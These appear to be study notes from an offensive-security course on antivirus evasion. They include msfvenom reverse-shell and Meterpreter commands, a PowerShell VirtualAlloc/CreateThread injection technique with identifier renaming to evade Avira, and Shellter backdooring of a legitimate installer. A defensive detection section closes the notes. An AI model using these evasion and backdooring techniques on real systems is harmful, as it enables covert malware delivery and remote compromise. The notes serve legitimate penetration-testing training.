Objective

Understand how modern antivirus engines detect malware — signatures, heuristics, behavioral analysis, machine learning — then put that knowledge to work against a specific product: generate a detectable Metasploit payload, confirm it's flagged, and bypass the deployed AV twice — once manually (hand-edited PowerShell in-memory injection) and once with automation (Shellter backdooring a legitimate installer). The module's guiding constraint: a universal AV bypass is impractical during a time-boxed engagement, so target the specific AV product deployed in the target network.

1. How AV detection actually works (module 45)

Four layered methodologies; vendors combine them, and each vendor's implementation differs enough that "is X detected?" is a per-product question:

  • Signature-based — a restricted list technology: scan the filesystem for known patterns (or the file's hash) and quarantine hits. A signature can be as simple as the file hash or a set of binary/string patterns unique to that malware.
  • Heuristic-based — rules and algorithms deciding whether an action/binary is malicious.
  • Behavior-based — dynamic analysis of what the binary does at runtime.
  • Machine learning — algorithms classifying unknown threats from collected metadata.

The module demonstrates why hash-only detection is weak with a two-file experiment on Kali:

xxd -b file.txt        # binary dump: offset | binary | ASCII ("offsec")
sha256sum file.txt
xxd -b file2.txt       # same string, last letter capitalized — third bit from the left flips
sha256sum file2.txt    # completely different hash

One flipped bit → entirely different hash → the "signature" is gone. The demonstration ends by generating a standard payload and measuring its exposure:

msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o payload.exe
# ⚠️ reconstructed: transcript names the -p payload, LHOST/LPORT args, and -f format but not the exact strings

Upload to VirusTotal (rather than installing dozens of AV products) to see how many engines flag it — many do, via exactly the mechanisms above.

2. Manual evasion: PowerShell remote process memory injection (module 46)

Setup discipline first: on the Windows 11 client, Security → Protection Options → verify real-time protection is enabled. Then validate the AV works at all before testing bypasses — transfer the known-bad msfvenom PE from the attacker web server and confirm Avira blocks/quarantines it. (Testing a bypass against an AV you never confirmed detects anything proves nothing.)

Why a script beats a PE: PowerShell can call the Windows API directly, letting you implement in-memory injection in an interpreted script. The script itself is not executable code, so AV engines struggle to fingerprint it — and if flagged, it's plain text: variable names, comments, and logic can all be changed with nothing to recompile. (Caveat the module states: some AV products are better than others at script detection.)

The reference injection script:

  • Imports VirtualAlloc and CreateThread from kernel32.dll, and memset from the Microsoft C runtime DLL — allocate memory, create an execution thread, write arbitrary bytes respectively.
  • Main flow: VirtualAlloc allocates a block → memset copies each byte of the payload stored in a byte array ($sc) into the block → CreateThread runs the payload in a separate thread.
  • The shellcode is generated with msfvenom (x86 format for the x86 PowerShell interpreter) and pasted into the $sc variable.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f powershell
# ⚠️ reconstructed; transcript says "payload generated using msfvenom ... copied into the SC variable"

Measure the baseline: antiscan.me (preferred) doesn't support .ps1, so VirusTotal it — 27 of 61 engines flag it, including Avira.

The bypass — exploit the fact that script AV often keys on static string signatures of meaningful identifiers:

  • Rename the hardcoded win32 class-name string used by Add-Type to something generic (iwin32).
  • Rename winfunc and $sc to var1 / var2.

Rescan: Avira's quick scan now reports the script clean. Then run it:

# x86 payload → x86 PowerShell
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -Scope CurrentUser Unrestricted   # policies are per-user, not per-system
.\bypass.ps1

⚠️ Two details from the walkthrough: the script initially fails on execution policy — Microsoft docs show policies are per-user, so changing the current user's scope to Unrestricted suffices. Start the Netcat listener on Kali before launching; the script executes and a reverse shell lands. The module closes with the caveat that mature organizations may run script-content ML analysis — scripts may need per-environment adaptation.

3. Automated evasion: Shellter (module 47)

Shellter is a dynamic shellcode injection tool that backdoors a valid, non-malicious PE with your payload. Its approach (per the module): thoroughly analyze the target PE and its execution paths, find an injection point that avoids easily-caught traditional techniques (changing PE section permissions, creating new sections, etc.), and reuse the PE's existing import address table entries for the memory allocation/transfer/execution of the payload.

Run shellter on Kali (spawns a console under Wine); modes are auto or manual (manual launches the PE for granular control — auto is used here, A at the prompt):

  1. Point Shellter at the target PE — the lab uses the Windows 32-bit trial installer for Spotify. Shellter backs up the original file before touching it.
  2. Enable Stealth Mode when prompted — restores the PE's original execution flow after the payload runs, so the installer behaves normally and nobody gets suspicious. (In the lab the installer hangs because the VM has no internet, but the window still appears.)
  3. Choose the payload — L for listed payloads (Meterpreter etc.; custom payloads also supported). The module deliberately picks the Meterpreter reverse shell Avira flagged at the start of the module, so the test is a like-for-like evasion. Fill the Metasploit defaults (LHOST = Kali IP, LPORT = listener port).
  4. Shellter injects and verifies it can reach the payload's first instruction.

Why it evades: Shellter obfuscates both the payload and its decoder before injecting, so Avira's signature-based quick scan (which checks common user folders including the desktop) comes back clean.

On the target: transfer the backdoored installer, run an Avira quick scan (clean), execute the file, and collect the session in multi/handler on Kali. The module verifies the shell landed on the target as the lab's offsec user. Positioning: this foundational example is meant to be expanded and tailored case-by-case in real phishing engagements.

Detection & defense

  • Defense-in-depth inside the AV: the module's bypasses all defeat static/signature layers specifically. Hash-only detection is trivially defeated (one flipped bit); script string signatures are defeated by renaming identifiers. Heuristics, behavioral monitoring, and ML on script content are the layers that catch the post-bypass behavior (API allocation + thread creation + outbound connection) — enable and tune them.
  • Script controls: Constrained Language Mode, AMSI, script block logging, and transcription catch obfuscated PowerShell regardless of variable names — the manual bypass renamed var1/var2, but the behavior (VirtualAlloc→memset→CreateThread) is invariant and observable.
  • Execution policy is not a security boundary: it's per-user, user-changeable, and set to Unrestricted in the walkthrough. Don't rely on it; use application control (WDAC/AppLocker) over what scripts may run at all.
  • LOLBin / legitimate-PE abuse: Shellter's whole premise is that the malicious code hides inside a trusted, signed-looking installer reusing its own IAT — detections should favor behavioral and provenance signals (installer initiating outbound reverse connections, unexpected code flow) over trusting file reputation.
  • Know your deployed AV: the module's core operational lesson applies defensively too — attackers will profile which engine you run and test against it specifically (VirusTotal/antiscan.me pre-checks). Rotate or diversify endpoint AV configurations so a bypass validated against one product isn't a network-wide bypass.
  • Egress correlation: both bypasses end in an outbound reverse shell from a user-context process to an external host — payload delivery via a web server (Powercat/PS1 GET requests) and reverse-shell beacons are the reliable, payload-agnostic detection points.
